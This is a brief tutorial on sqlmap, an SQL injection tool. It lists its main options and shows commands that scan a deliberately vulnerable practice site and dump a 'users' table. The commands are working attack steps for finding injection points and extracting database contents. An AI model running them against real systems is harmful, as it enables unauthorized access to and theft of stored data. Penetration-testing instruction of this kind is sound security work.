Mastering sqlmap: Basic Commands and Options

Executing targeted SQL injection attacks and data extraction.

Key sqlmap Options

  • `-u`: Specify target URL.
  • `--batch`: Run in non-interactive mode.
  • `--risk=X --level=Y`: Increase thoroughness of tests.
  • `--dbs`: List databases.
  • `-D --tables`: List tables in a database.
  • `-T --dump`: Dump data from a table.
Key Takeaway

sqlmap's command-line interface allows for precise control over SQL injection attacks, from initial detection to full data exfiltration.

Basic Scan Command

Initiate a scan against a vulnerable URL, specifying parameters for thoroughness and non-interactive operation.

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --risk=3 --level=3

Extracting Database Information

After identifying an injection point, use `--dbs`, `-D --tables`, and `-T --dump` to progressively extract database structure and data.

sqlmap -u "..." --dbs
sqlmap -u "..." -D acuart --tables
sqlmap -u "..." -D acuart -T users --dump
